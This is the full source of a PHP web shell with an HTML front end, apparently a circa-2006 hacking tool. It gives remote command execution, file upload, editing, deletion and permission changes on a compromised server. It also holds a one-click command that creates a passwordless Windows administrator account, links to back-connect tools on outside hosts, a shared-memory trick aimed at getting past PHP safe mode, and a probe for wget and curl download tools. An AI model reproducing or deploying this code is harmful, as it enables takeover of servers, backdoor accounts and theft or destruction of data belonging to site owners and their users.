<html>

<head>
<meta http-equiv="Content-Language" content="pt-br">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="AoD">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>By xIgOr > AoD > CMD > File List</title>
<style type="text/css">
A:link {text-decoration:none}
A:visited {text-decoration:none}
A:hover {text-decoration:underline}
A:active {text-decoration:underline}
</style>
</head>
<body style="font-family: Tahoma; font-size: 10px">
#udp @ irc.mildnet.org
<!--

 @set_time_limit(0);

 $string = $_SERVER['QUERY_STRING'];
 $mhost = 'http://legiaourbana.itafree.com/cmd/list.txt?';
 $host_all = explode("$mhost", $string);
 $s1 = $host_all[0];
 $fstring = $_SERVER['PHP_SELF']."?".$s1.$mhost;

 $OS = @PHP_OS;
 $IpServer = '127.0.0.1';
 $UNAME = @php_uname();
 $PHPv = @phpversion();
 $SafeMode = @ini_get('safe_mode');

 if ($SafeMode == '') { $SafeMode = "<i>OFF</i>"; }
 else { $SafeMode = "<i>$SafeMode</i>"; }

 $btname = 'backtool.txt';
 $bt = 'http://www.full-comandos.com/jobing/r0nin';
 $dc = 'http://www.full-comandos.com/jobing/dc.txt';
 $newuser = '@echo off;net user Admin /add /expires:never /passwordreq:no;net localgroup &quot;Administrators&quot; /add Admin;net localgroup &quot;Users&quot; /del Admin';
 // Java Script
 echo "<script type=\"text/javascript\">";
 echo "function ChMod(chdir, file) {";
 echo "var o = prompt('Chmod: - Exemple: 0777', '');";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=chmod&chdir=' + chdir + '&file=' + file + '&chmod=' + o + \"\";";
 echo "}";
 echo "}";
 echo "function Rename(chdir, file, mode) {";
 echo "if (mode == 'edit') {";
 echo "var o = prompt('Rename file '+ file + ' for:', '');";
 echo "}";
 echo "else {";
 echo "var o = prompt('Rename dir '+ file + ' for:', '');";
 echo "}";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=rename&chdir=' + chdir + '&file=' + file + '&newname=' + o + '&mode=' + mode +\"\";";
 echo "}";
 echo "}";
 echo "function Copy(chdir, file) {";
 echo "var o = prompt('Copied for:', '/tmp/' + file);";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=copy&chdir=' + chdir + '&file=' + file + '&fcopy=' + o + \"\";";
 echo "}";
 echo "}";
 echo "function Mkdir(chdir) {";
 echo "var o = prompt('Which name?', 'NewDir');";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=mkdir&chdir=' + chdir + '&newdir=' + o + \"\";";
 echo "}";
 echo "}";
 echo "function Newfile(chdir) {";
 echo "var o = prompt('Which name?', 'NewFile.txt');";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=newfile&chdir=' + chdir + '&newfile=' + o + \"\";";
 echo "}";
 echo "}";
 echo "</script>";

 // End JavaScript

	/* Functions */
	function cmd($CMDs) {
		$CMD[1] = '';
		exec($CMDs, $CMD[1]);
		if (empty($CMD[1])) {
			$CMD[1] = shell_exec($CMDs);
		}
			elseif (empty($CMD[1])) {
			$CMD[1] = passthru($CMDs);
		}
		elseif (empty($CMD[1])) {
			$CMD[1] = system($CMDs);
		}
		elseif (empty($CMD[1])) {
			$handle = popen($CMDs, 'r');
			while(!feof($handle)) {
				$CMD[1][] .= fgets($handle);
			}
			pclose($handle);
		}
		return $CMD[1];
	}
 
if (@$_GET['chdir']) {
 $chdir = $_GET['chdir']; 
} else {
   $chdir = getcwd()."/";
  }
if (@chdir("$chdir")) {
 $msg = "<font color=\"#008000\">Entrance&nbsp;in&nbsp;the&nbsp;directory,&nbsp;OK!</font>";
} else {
 $msg = "<font color=\"#FF0000\">Error&nbsp;to&nbsp;enters&nbsp;it&nbsp;in&nbsp;the&nbsp;directory!</font>";
 $chdir = str_replace($SCRIPT_NAME, "", $_SERVER['SCRIPT_NAME']);
}
 $chdir = str_replace(chr(92), chr(47), $chdir);

if (@$_GET['action'] == 'upload') {
 $uploaddir = $chdir;
 $uploadfile = $uploaddir. $_FILES['userfile']['name'];
 if (@move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $_FILES['userfile']['name'])) {
  $msg = "<font color=\"#008000\"><font color=\"#000080\">{$_FILES['userfile']['name']}</font>,&nbsp;the&nbsp;archive&nbsp;is&nbsp;validates&nbsp;and&nbsp;was&nbsp;loaded&nbsp;successfully.</font>";
 } else {
    $msg = "<font color=\"#FF0000\">Error&nbsp;when&nbsp;copying&nbsp;archive.</font>";
   }
}
elseif (@$_GET['action'] == 'mkdir') {
    $newdir = $_GET['newdir'];
    if (@mkdir("$chdir"."$newdir")) {
     $msg = "<font color=\"#008000\"><font color=\"#000080\">{$newdir}</font>,&nbsp;directory&nbsp;created successfully.</font>";
    } else {
       $msg = "<font color=\"#FF0000\">Error&nbsp;to&nbsp;it&nbsp;creates&nbsp;directory.</font>";
      }
}
elseif (@$_GET['action'] == 'newfile') {
    $newfile = $_GET['newfile'];
    if (@touch("$chdir"."$newfile")) {
     $msg = "<font color=\"#008000\"><font color=\"#000080\">{$newfile}</font>,&nbsp;created successfully!</font>";
    } else {
       $msg = "<font color=\"#FF0000\">Error&nbsp;to&nbsp;tries&nbsp;it&nbsp;creates&nbsp;archive.</font>";
      }
}

elseif (@$_GET['action'] == 'del') {
     $file = $_GET['file']; $type = $_GET['type'];
     if ($type == 'file') {
      if (@unlink("$chdir"."$file")) {
       $msg = "<font color=\"#008000\"><font color=\"#000080\">{$file}</font>,&nbsp;successfully&nbsp;excluded&nbsp;archive!</font>";
      } else {
         $msg = "<font color=\"#FF0000\">Error&nbsp;to&nbsp;it&nbsp;I&nbsp;excluded&nbsp;archive!</font>";
        }
     } elseif ($type == 'dir') {
        if (@rmdir("$chdir"."$file")) {
          $msg = "<font color=\"#008000\"><font color=\"#000080\">{$file}</font>,&nbsp;successfully&nbsp;excluded&nbsp;directory!</font>";
        } else {
           $msg = "<font color=\"#FF0000\">Error&nbsp;to&nbsp;it&nbsp;I&nbsp;excluded&nbsp;directory!</font>";
          }
       }
}
elseif (@$_GET['action'] == 'chmod') {
     $file = $chdir.$_GET['file']; $chmod = $_GET['chmod'];
     if (@chmod ("$file", $chmod)) {
  
      $msg = "<font color=\"#008000\">Chmod&nbsp;of</font>&nbsp;<font color=\"#000080\">{$_GET['file']}</font>&nbsp;<font color=\"#008000\">moved&nbsp;for</font>&nbsp;<font color=\"#000080\">$chmod</font>&nbsp;<font color=\"#008000\">successfully.</font>";
     } else {
        $msg = '<font color=\"#FF0000\">Error&nbsp;when&nbsp;moving&nbsp;chmod.</font>';
       }
}
elseif (@$_GET['action'] == 'rename') {
     $file = $_GET['file']; $newname = $_GET['newname'];
     if (@rename("$chdir"."$file", "$chdir"."$newname")) {
      $msg = "<font color=\"#008000\">Archive</font>&nbsp;<font color=\"#000080\">{$file}</font>&nbsp;<font color=\"#008000\">named for</font>&nbsp;<font color=\"#000080\">{$newname}</font>&nbsp;<font color=\"#008000\">successfully!</font>";
     } else {
        $msg = "<font color=\"#FF0000\">Error&nbsp;to&nbsp;it&nbsp;nominates&nbsp;archive.</font>";
       }
}
elseif (@$_GET['action'] == 'copy') {
    $file = $chdir.$_GET['file']; $copy = $_GET['fcopy'];
    if (@copy("$file", "$copy")) {
     $msg = "<font color=\"#000080\">{$file}</font>,&nbsp;<font color=\"#008000\">copied for</font> <font color=\"#000080\">{$copy}</font> <font color=\"#008000\">successfully!</font>";
    } else {
       $msg = "<font color=\"#FF0000\">Error&nbsp;when&nbsp;copying</font>&nbsp;<font color=\"#000000\">{$file}</font>&nbsp;<font color=\"#FF0000\">for</font>&nbsp;<font color=\"#000000\">{$copy}</font></font>";
      }
}
/* Parte Atualiza 02:48 12/2/2006 */

elseif (@$_GET['action'] == 'cmd') {
	if (!empty($_GET['cmd'])) { $cmd = @$_GET['cmd']; }
	if (!empty($_POST['cmd'])) { $cmd = @$_POST['cmd']; }
	$cmd = stripslashes(trim($cmd));
	$result_arr = cmd($cmd);
	
	$afim = count($result_arr); $acom = 0; $msg = '';
	$msg .= "<p style=\"color: #000000;text-align: center;font-family: 'Lucida Console';font-size: 12px;margin 2\">Results:&nbsp;<b>".$cmd."</b></p>";
	if ($result_arr) {
		while ($acom <= $afim) {
			$msg .= "<p style=\"color: #008000;text-align: left;font-family: 'Lucida Console';font-size: 12px;margin 2\">&nbsp;".@$result_arr[$acom]."</p>";
		$acom++;
 		}
	}
	else {
		$msg .= "<p style=\"color: #FF0000;text-align: center;font-family: 'Lucida Console';font-size: 12px;margin 2\">Erro ao executar comando.</p>";
	}
}
elseif (@$_GET['action'] == 'safemode') {
if (@!extension_loaded('shmop')) {
 echo "Loading... module</br>";

    if (strtoupper(substr(PHP_OS, 0,3) == 'WIN')) {
        @dl('php_shmop.dll');
    } else {
        @dl('shmop.so');
    }
}

if (@extension_loaded('shmop')) {
 echo "Module: <b>shmop</b> loaded!</br>";

 $shm_id = @shmop_open(0xff2, "c", 0644, 100);
 if (!$shm_id) { echo "Couldn't create shared memory segment\\\\\\\\n"; }
 $data="\\\\\\\\x00";
 $offset=-3842685;
 $shm_bytes_written = @shmop_write($shm_id, $data, $offset);
 if ($shm_bytes_written != strlen($data)) { echo "Couldn't write the entire length of data\\\\\\\\n"; }
 if (!shmop_delete($shm_id)) { echo "Couldn't mark shared memory block for deletion."; }
 echo passthru("id"); 
 shmop_close($shm_id);


} else { echo "Module: <b>shmop</b> not loaded!</br>"; }
}

elseif (@$_GET['action'] == 'zipen') {
 $file = $_GET['file'];
 $zip = @zip_open("$chdir"."$file");
 $msg = '';
if ($zip) {

    while ($zip_entry = zip_read($zip)) {
        $msg .= "Name:               " . zip_entry_name($zip_entry) . "\\\\\\\\n";
        $msg .= "Actual Filesize:    " . zip_entry_filesize($zip_entry) . "\\\\\\\\n";
        $msg .= "Compressed Size:    " . zip_entry_compressedsize($zip_entry) . "\\\\\\\\n";
        $msg .= "Compression Method: " . zip_entry_compressionmethod($zip_entry) . "\\\\\\\\n";

        if (zip_entry_open($zip, $zip_entry, "r")) {
            echo "File Contents:\\\\\\\\n";
            $buf = zip_entry_read($zip_entry, zip_entry_filesize($zip_entry));
            echo "$buf\\\\\\\\n";

            zip_entry_close($zip_entry);
        }
        echo "\\\\\\\\n";

    }

    zip_close($zip);

}
}
elseif (@$_GET['action'] == 'edit') {
 $file = $_GET['file'];
 $conteudo = '';
 $filename = "$chdir"."$file";
 $conteudo = @file_get_contents($filename);
 $conteudo = htmlspecialchars($conteudo);
 $back = $_SERVER['HTTP_REFERER'];
 echo "<p align=\"center\">Editing&nbsp;{$file}&nbsp;...</p>";
 echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" width=\"100%\" id=\"editacao\">";
 echo "<tr>";
 echo "<td width=\"100%\">";
 echo "<form method=\"POST\" action=\"{$fstring}&amp;action=save&amp;chdir={$chdir}&amp;file={$file}\">";
 echo "<!--webbot bot=\"SaveResults\" u-file=\"_private/form_results.csv\" s-format=\"TEXT/CSV\" s-label-fields=\"TRUE\" --><p align=\"center\">";
 print "<textarea rows=\"18\" name=\"S1\" cols=\"89\" style=\"font-family: Verdana; font-size: 10pt; border: 1px solid #000000\">{$conteudo}</textarea></p>";
 echo "<p align=\"center\">";
 echo "<input type=\"submit\" value=\"Save\" name=\"B2\" style=\"font-family: Tahoma; font-size: 10px; border: 1px solid #000000\">&nbsp;";
 echo "<input type=\"button\" value=\"Closes Publisher\" Onclick=\"javascript:window.location='{$fstring}&amp;chdir={$chdir}'\" name=\"B1\" style=\"font-family: Tahoma; font-size: 10px; border: 1px solid #000000\">&nbsp;";
 echo "</form>";
 echo "</td>";
 echo "</tr>";
 echo "</table>";
}
elseif (@$_GET['action'] == 'save') {
   $filename = "$chdir".$_GET['file'];
   $somecontent = $_POST['S1'];
   $somecontent = stripslashes(trim($somecontent));
   if (is_writable($filename)) {
    @$handle = fopen ($filename, "w");
    @$fw = fwrite($handle, $somecontent);
    @fclose($handle);
    if ($handle && $fw) {
     $msg = "<font color=\"#000080\">{$_GET['file']}</font>,&nbsp;<font color=\"#008000\">edited&nbsp;successfully!</font>";
    }
 } else {
    $msg = "<font color=\"#000000\">{$_GET['file']},</font>&nbsp;<font color=\"#FF0000\">cannot&nbsp;be&nbsp;written!</font>";
   }
}

// Informações
 $cmdget = '';
 if (!empty($_GET['cmd'])) { $cmdget = @$_GET['cmd']; }
 if (!empty($_POST['cmd'])) { $cmdget = @$_POST['cmd']; }
 $cmdget = htmlspecialchars($cmdget);
 function asdads() {
  $asdads = '';
  if (@file_exists("/usr/bin/wget")) { $asdads .= "wget&nbsp;"; }
  if (@file_exists("/usr/bin/fetch")) { $asdads .= "fetch&nbsp;"; }
  if (@file_exists("/usr/bin/curl")) { $asdads .= "curl&nbsp;"; }
  if (@file_exists("/usr/bin/GET")) { $asdads .= "GET&nbsp;"; }
  if (@file_exists("/usr/bin/lynx")) { $asdads .= "lynx&nbsp;"; }
  return $asdads;
 }

echo "<form method=\"POST\" name=\"cmd\" action=\"{$fstring}&amp;action=cmd&amp;chdir=$chdir\">";
echo "<fieldset style=\"border: 1px solid #000000; padding: 2\">";
echo "<legend>Informações</legend>";
echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse; font-family: Tahoma; font-size: 10px\" width=\"100%\">";
echo "<tr>";
echo "<td width=\"8%\">";
echo "<p align=\"right\"><b>Sistema:</b>&nbsp;</td></p>";
echo "<td width=\"92%\">&nbsp;{$OS}</td>";
echo "</tr>";
echo "<tr>";
echo "<td width=\"8%\">";
echo "<p align=\"right\"><b>Uname:&nbsp;</b></td></p>";
echo "<td width=\"92%\">&nbsp;{$UNAME}</td>";
echo "</tr>";
echo "<tr>";
echo "<td width=\"8%\">";
echo "<p align=\"right\"><b>PHP:&nbsp;</b></td></p>";
echo "<td width=\"92%\">&nbsp;{$PHPv},&nbsp;<b>safe mode:</b>&nbsp;{$SafeMode}</td>";
echo "</tr>";
 if (strtoupper(substr($OS, 0,3) != 'WIN')) {
  $Methods = asdads();
  if ($Methods == '') { $Methods = "???"; }
  echo "<tr>";
  echo "<td width=\"8%\">";
  echo "<p align=\"right\"><b>Methods:&nbsp;</b></td></p>";
  echo "<td width=\"92%\">&nbsp;{$Methods}</td>";
  echo "</tr>";
 }

echo "<tr>";
echo "<td width=\"8%\">";
echo "<p align=\"right\"><b>Ip:&nbsp;</b></td></p>";
echo "<td width=\"92%\">&nbsp;{$IpServer}</td>";
echo "</tr>";
echo "<tr>";
echo "<td width=\"8%\">";
echo "<p align=\"right\"><b>Command:&nbsp;</b></td></p>";
echo "<td width=\"92%\">&nbsp;<input type=\"text\" size=\"70\" name=\"cmd\" value=\"{$cmdget}\" style=\"font-family: Tahoma; font-size: 10 px; border: 1px solid #000000\">&nbsp;<input type=\"submit\" name=\"action\" value=\"Send\" style=\"font-family: Tahoma; font-size: 10 px; border: 1px solid #000000\"></td>";
echo "</tr>";
echo "</table>";
echo "</fieldset></form>";
// Dir

echo "<form method=\"POST\" action=\"{$fstring}&amp;action=upload&amp;chdir=$chdir\" enctype=\"multipart/form-data\">";
echo "<!--webbot bot=\"FileUpload\" u-file=\"_private/form_results.csv\" s-format=\"TEXT/CSV\" s-label-fields=\"TRUE\" --><fieldset style=\"border: 1px solid #000000; padding: 2\">";
if (is_writable("$chdir")) {
 if (strtoupper(substr($OS, 0,3) == 'WIN')) {
  echo "<legend>Dir&nbsp;<b>YES</b>:&nbsp;{$chdir}&nbsp;-&nbsp;<a href=\"#[New Dir]\" onclick=\"Mkdir('{$chdir}');\">[New Dir]</a>&nbsp;<a href=\"#[New File]\" onclick=\"Newfile('{$chdir}')\">[New File]</a>&nbsp;<a href=\"{$fstring}&amp;action=cmd&amp;chdir={$chdir}&amp;cmd=$newuser\">[Remote Access]</a></legend>";
 } else {
    echo "<legend>Dir&nbsp;<b>YES</b>:&nbsp;{$chdir}&nbsp;-&nbsp;<a href=\"#[New Dir]\" onclick=\"Mkdir('{$chdir}');\">[New Dir]</a>&nbsp;<a href=\"#[New File]\" onclick=\"Newfile('{$chdir}')\">[New File]</a>&nbsp;<a href=\"{$fstring}&amp;action=backtool&amp;chdir={$chdir}&amp;write=yes\">[BackTool]</a></legend>";
   } 
}
else {
if (strtoupper(substr($OS, 0,3) == 'WIN')) {
  echo "<legend>Dir&nbsp;NO:&nbsp;{$chdir}&nbsp;-&nbsp;<a href=\"#[New Dir]\" onclick=\"Mkdir('{$chdir}');\">[New Dir]</a>&nbsp;<a href=\"#[New File]\" onclick=\"Newfile('{$chdir}')\">[New File]</a>&nbsp;<a href=\"{$fstring}&amp;action=cmd&amp;chdir={$chdir}&amp;cmd={$newuser}\">[Remote Access]</a></legend>";
 } else {
    echo "<legend>Dir&nbsp;NO:&nbsp;{$chdir}&nbsp;-&nbsp;<a href=\"#[New Dir]\" onclick=\"Mkdir('{$chdir}');\">[New Dir]</a>&nbsp;<a href=\"#[New File]\" onclick=\"Newfile('{$chdir}')\">[New File]</a>&nbsp;<a href=\"{$fstring}&amp;action=backtool&amp;chdir={$chdir}&amp;write=no\">[BackTool]</a></legend>";
   } 
}

if (@!$handle = opendir("$chdir")) {
 echo "&nbsp;I&nbsp;could&nbsp;not&nbsp;enters&nbsp;in&nbsp;the&nbsp;directory,&nbsp;<a href=\"{$fstring}\">click here!</a>&nbsp;for&nbsp;return&nbsp;to&nbsp;the&nbsp;original&nbsp;directory!</br>";
}
else {
echo "  <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse; font-family: Tahoma; font-size: 10px\" width=\"100%\">";
echo "    <tr>";
echo "      <td width=\"100%\" style=\"font-family: Tahoma; font-size: 10px\" colspan=\"4\">&nbsp;Upload:";
echo "      <input type=\"file\" name=\"userfile\" size=\"91\" style=\"font-family: Tahoma; font-size: 10px; border-style: solid; border-width: 1\">";
echo "      <input type=\"submit\" value=\"Send\" name=\"B1\" style=\"font-family: Tahoma; font-size: 10px; border: 1px solid #000000\"></td>";
echo "    </tr>";
echo "    <tr>";
echo "      <td width=\"100%\" style=\"font-family: Tahoma; font-size: 10px\" colspan=\"4\">&nbsp;</td>";
echo "    </tr>";
echo "    <tr>";
echo "      <td width=\"100%\" style=\"font-family: Tahoma; font-size: 10px\" colspan=\"4\">";
if (@!$msg) {
 echo "      <p align=\"left\">Messages</td>";
} else {
   echo "      <p align=\"left\">$msg</td>";
  }
echo "    </tr>";
echo "    <tr>";
echo "      <td width=\"100%\" colspan=\"4\">&nbsp;</td>";
echo "    </tr>";
echo "    <tr>";
echo "      <td width=\"9%\">&nbsp;Perms</td>";
echo "      <td width=\"49%\">&nbsp;File </td>";
echo "      <td width=\"10%\">&nbsp;Size </td>";
echo "      <td width=\"32%\">&nbsp;Commands</td>";
echo "    </tr>";
$colorn = 0;
    while (false !== ($file = readdir($handle))) {
        if ($file != '.') {
            if ($colorn == 0) {
             $color = "style=\"background-color: #FFCC66\"";
            }
            elseif ($colorn == 1) {
             $color = "style=\"background-color: #C0C0C0\"";
            }        
            if (@is_dir("$chdir"."$file")) {
             $file = $file.'/';
             $mode = 'chdir';
            } else { 
               $mode = 'edit'; 
             }
            if (@substr("$chdir", strlen($chdir) -1, 1) != '/') {
              $chdir .= '/';
            }
            if ($file == '../') {
             $lenpath = strlen($chdir); $baras = 0;
             for ($i = 0;$i < $lenpath;$i++) { if ($chdir{$i} == '/') { $baras++; } }
             $chdir_ = explode("/", $chdir);
             $chdirpox = str_replace($chdir_[$baras-1].'/', "", $chdir);
            }
            $perms = @fileperms ("$chdir"."$file");
            if ($perms == '') {
             $perms = '???';
            }
            $size = @filesize ("$chdir"."$file"); 
            $size = $size / 1024;
            $size = explode(".", $size);
            if (@$size[1] != '') {
             $size = $size[0].'.'.@substr("$size[1]", 0, 2);
            } else {
               $size = $size[0];
             }
            if ($size == 0) {
             if ($mode == 'chdir') {
              $size = '???';
             }
            }
            echo "<tr>";
	    echo "<td width=\"9%\" $color>&nbsp;$perms</td>";
            if (@is_writable ("$chdir"."$file")) {
             if ($mode == 'chdir') {
              if ($file == '../') {
               echo "<td width=\"49%\" $color>&nbsp;<b><a href=\"{$fstring}&amp;chdir=$chdirpox\">$file</a></b></td>";
              } else {
                 echo "<td width=\"49%\" $color>&nbsp;<b><a href=\"{$fstring}&amp;chdir={$chdir}{$file}\">$file</a></b></td>";                
                }
             } else {
		if (is_readable("$chdir"."$file")) {
                 echo "<td width=\"49%\" $color>&nbsp;<b><a href=\"{$fstring}&amp;action=edit&amp;chdir=$chdir&amp;file=$file\">$file</a></b></td>";
                } else {
                   echo "<td width=\"49%\" $color>&nbsp;<b>$file</b></td>";
                  }
               }
            } 
           else {
             if ($mode == 'chdir') {
              if ($file == '../') {
               echo "<td width=\"49%\" $color>&nbsp;<a href=\"{$fstring}&amp;chdir=$chdirpox\">$file</a></td>";
              } else {
                 echo "<td width=\"49%\" $color>&nbsp;<a href=\"{$fstring}&amp;chdir={$chdir}{$file}\">$file</a></td>";                
               }
             } else {
		if (@is_readable("$chdir"."$file")) {
                 echo "<td width=\"49%\" $color>&nbsp;<a href=\"{$fstring}&amp;action=edit&amp;chdir=$chdir&amp;file=$file\">$file</a></td>";
                } else {
                   echo "<td width=\"49%\" $color>&nbsp;$file</td>";
                 }
               }
             }
            echo "<td width=\"10%\" $color>&nbsp;$size&nbsp;KB</td>";
            if ($mode == 'edit') {
             echo "<td width=\"32%\" $color>&nbsp;<a href=\"#{$file}\" onclick=\"Rename('{$chdir}', '{$file}', '{$mode}')\">[Rename]</a>&nbsp;<a href=\"{$fstring}&amp;action=del&amp;chdir={$chdir}&amp;file={$file}&amp;type=file\">[Del]</a>&nbsp;<a href=\"#{$file}\" onclick=\"ChMod('$chdir', '$file')\">[Chmod]</a>&nbsp;<a href=\"#{$file}\" onclick=\"Copy('{$chdir}', '{$file}')\">[Copy]</a></td>";
            } else {
               echo "<td width=\"32%\" $color>&nbsp;<a href=\"#{$file}\" onclick=\"Rename('{$chdir}', '{$file}', '{$mode}')\">[Rename]</a>&nbsp;<a href=\"{$fstring}&amp;action=del&amp;chdir={$chdir}&amp;file={$file}&amp;type=dir\">[Del]</a>&nbsp;<a href=\"#{$file}\" onclick=\"ChMod('$chdir', '$file')\">[Chmod]</a>&nbsp;[Copy]</td>";
              }   
            echo "</tr>";
            if ($colorn == 0) {
             $colorn = 1;
            }
            elseif ($colorn == 1) {
             $colorn = 0;
            }
        }
    }
    closedir($handle);
}
?>
  </table>
  </fieldset></form>
  <p align="center">
    <a href="http://validator.w3.org/check?uri=referer"><img
        src="http://www.w3.org/Icons/valid-html401"
        alt="Valid HTML 4.01 Transitional" height="31" width="88"></a>
  </p>
</body>

</html>
